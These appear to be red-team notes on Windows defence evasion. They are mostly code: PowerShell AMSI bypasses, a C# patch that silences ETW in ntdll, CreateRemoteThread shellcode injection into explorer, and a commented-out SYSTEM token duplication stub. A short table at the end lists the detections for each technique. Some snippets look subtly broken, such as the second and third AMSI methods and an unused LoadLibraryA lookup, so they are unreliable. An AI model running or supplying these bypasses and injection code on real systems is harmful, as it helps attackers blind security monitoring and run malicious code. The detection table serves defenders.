# AMSI / ETW Bypass Notes

## AMSI Bypass PowerShell

```powershell
# Method 1: amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: AmsiUtils.amsiInitFailed
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($a,$null)

# Method 3: Unset
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly::LoadFile("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Management.Automation.dll").GetType("System.Management.Automation.AmsiUtils").GetMethod("amsiInitFailed",[Reflection.BindingFlags]"NonPublic,Static").Invoke($null,@())
```

## ETW Bypass

```csharp
// Patch ETW in ntdll
using System;
using System.Runtime.InteropServices;

class ETWBypass {
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, uint size, uint newProtect, out uint oldProtect);
    
    static void Main() {
        // Find EtwEventWrite function in ntdll
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr EtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        
        // Patch to 'ret' (0xC3)
        VirtualProtect(EtwEventWrite, 1, 0x40, out uint old);
        byte[] patch = { 0xC3 };
        Marshal.Copy(patch, 0, EtwEventWrite, 1);
        VirtualProtect(EtwEventWrite, 1, old, out _);
    }
    
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
```

## Process Injection (test EDR userland hooks)

```csharp
// Classic CreateRemoteThread + LoadLibrary
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class ProcInject {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint allocType, uint prot);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] data, uint size, out uint written);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attrs, uint stackSize, IntPtr start, IntPtr param, uint flags, IntPtr threadId);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    static void Main() {
        string target = "explorer";
        Process p = Process.GetProcessesByName(target)[0];
        byte[] shellcode = { /* msfvenom calc shellcode */ };
        IntPtr hProc = OpenProcess(0x1F0FFF, false, p.Id);
        IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        WriteProcessMemory(hProc, alloc, shellcode, (uint)shellcode.Length, out _);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProc, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

## Token Stealing / Manipulation

```csharp
// Duplicate SYSTEM token to current process
using System;
using System.Runtime.InteropServices;

class TokenDup {
    [DllImport("advapi32.dll")]
    static extern bool OpenProcessToken(IntPtr proc, uint access, out IntPtr handle);
    
    [DllImport("advapi32.dll")]
    static extern bool DuplicateTokenEx(IntPtr src, uint access, IntPtr attrs, int lvl, int type, out IntPtr dup);
    
    [DllImport("advapi32.dll")]
    static extern bool ImpersonateLoggedOnUser(IntPtr handle);
    
    static void Main() {
        // Process targetProcess = ...; need to get SYSTEM token
        // OpenProcessToken(hProc, 0x2, out IntPtr hToken);
        // DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out IntPtr hDup);
        // ImpersonateLoggedOnUser(hDup);
    }
}
```

## Detection Evasion Reality

| Defense | Catches |
|---------|---------|
| AMSI bypass | Most AMSI bypasses have signature detections |
| ETW patching | Defender ATP alerts on ntdll modifications |
| Process injection | Modern EDR catches userland CreateRemoteThread |
| Sysmon EID 8 | CreateRemoteThread into other process |
| Sysmon EID 10 | ProcessAccess to LSASS |
| Defender credential guard | No LSASS handle, no creds |

